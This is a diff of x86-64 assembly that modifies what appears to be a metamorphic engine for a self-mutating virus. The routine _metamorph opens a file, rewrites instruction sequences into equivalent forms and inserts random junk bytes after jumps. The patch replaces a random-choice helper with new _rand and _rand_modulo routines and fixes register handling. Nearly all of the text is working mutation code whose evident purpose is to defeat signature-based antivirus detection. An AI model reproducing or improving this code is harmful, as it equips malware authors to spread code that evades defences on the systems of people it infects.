@@ -127,9 +127,14 @@ _h3ll0w0rld:
 		add rsp, 4096
 		pop rcx
 		pop rdx
-		jmp .there + 2
+		jmp .after
 	.there:
 		jmp .here + 2
+		push 8
+		nop
+		pop rax
+		nop
+	.after:
 
 %ifdef DEBUG
 	.debug:
@@ -1276,6 +1281,7 @@ ret
 ; I'm a pokemon
 _metamorph:; (rdi -> ptr)
 	push r8
+	push r9
 	push r11
 	push rsi
 	push rcx
@@ -1288,7 +1294,7 @@ _metamorph:; (rdi -> ptr)
 	mov rax, SYSCALL_OPEN
 	syscall
 	push rax
-	pop r11
+	pop r8
 	pop rdi
 
 	lea rax, [rel _params]
@@ -1408,13 +1414,18 @@ _metamorph:; (rdi -> ptr)
 		and dl, 0xb0; mov RXX, N
 		cmp dl, 0xb0
 		jz .swap_instruction_pattern_f
+		cmp word[rdi], `\xeb\x02`
+		je .swap_instruction_pattern_g
 		jmp .inc_rcx
 		.swap_instruction_pattern_a:; xor rax, rax; nop; nop; nop-> mov rax, 0; nop
 			cmp byte[rdi + 3], 0x90
 			jne .inc_rcx
 			cmp word[rdi + 4], 0x9090
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov rdx, rdi
@@ -1441,7 +1452,10 @@ _metamorph:; (rdi -> ptr)
 			jne .inc_rcx
 			cmp word[rdi + 4], 0x9090
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov rdx, rdi
@@ -1467,7 +1481,10 @@ _metamorph:; (rdi -> ptr)
 		.swap_instruction_pattern_c:; mov rax, 0; nop -> xor rax, rax; nop; nop; nop
 			cmp byte[rdi + 5], 0x90
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov rdx, rdi
@@ -1494,7 +1511,10 @@ _metamorph:; (rdi -> ptr)
 		.swap_instruction_pattern_d:; mov r8, 0 -> xor r8, r8; ;nop; nop; nop
 			cmp dword[rdi + 2], 0x00000000
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov rdx, rdi
@@ -1523,7 +1543,10 @@ _metamorph:; (rdi -> ptr)
 			jne .inc_rcx
 			cmp byte[rdi + 4], 0x90
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov dl, byte[rdi + 3]
@@ -1538,7 +1561,10 @@ _metamorph:; (rdi -> ptr)
 			jne .inc_rcx
 			cmp byte[rdi + 4], 0x00
 			jne .inc_rcx
-			call _yes_or_no
+			push rdi
+			mov rdi, 3
+			call _rand_modulo
+			pop rdi
 			cmp rax, 0x0
 			je .inc_rcx
 			mov dl, byte[rdi]
@@ -1549,6 +1575,13 @@ _metamorph:; (rdi -> ptr)
 			mov byte[rdi + 4], 0x90
 			add rcx, 4
 			jmp .inc_rcx
+		.swap_instruction_pattern_g:; after jmp $+4
+			call _rand
+			mov byte[rdi + 2], al
+			call _rand
+			mov byte[rdi + 3], al
+			add rcx, 4
+			jmp .inc_rcx
 		.inc_rcx:
 			pop rsi
 			pop rdi
@@ -1557,7 +1590,7 @@ _metamorph:; (rdi -> ptr)
 	.end_substitute_instruction:
 	pop rax
 
-	mov rdi, r11
+	mov rdi, r8
 	mov rax, SYSCALL_CLOSE
 	syscall
 
@@ -1565,43 +1598,48 @@ _metamorph:; (rdi -> ptr)
 	pop rcx
 	pop rsi
 	pop r11
+	pop r9
 	pop r8
 ret
 
-_yes_or_no:
-	push r11
-	push rdi
-	push rdx
+_rand_modulo:; rdi modulo
 	push rcx
-	push rsi
+	push rdx
 
-			sub rsp, 1
+		call _rand
+		xor rdx, rdx
+		div rdi
+		mov rax, rdx
 
-			mov rdi, r11
-			push r11
-			mov rsi, rsp
-			mov rdx, 1
-			xor rax, rax; READ
-			syscall
-			pop r11
-
-			xor rdx, rdx
-			xor rax, rax
-			movzx rax, byte[rsi]
-
-			add rsp, 1
-
-			push rdi
-			mov rdi, 3
-			div rdi
-			pop rdi
-			mov rax, rdx
-
-	pop rsi
-	pop rcx
 	pop rdx
+	pop rcx
+ret
+
+_rand:
+	push rdi
+	push rsi
+	push rcx
+	push rdx
+
+	mov rdi, r8
+	push r8
+	sub rsp, 1
+
+	mov rsi, rsp
+	mov rdx, 1
+	xor rax, rax; READ
+	syscall
+
+	xor rax, rax
+	movzx rax, byte[rsi]
+
+	add rsp, 1
+	pop r8
+
+	pop rdx
+	pop rcx
+	pop rsi
 	pop rdi
-	pop r11
 ret
 
 swap_registry db `\xc0\xb8\xff\xbf\xf6\xbe\xd2\xba\xc9\xb9\xdb\xbb\xe4\xbc\xed\xbd`
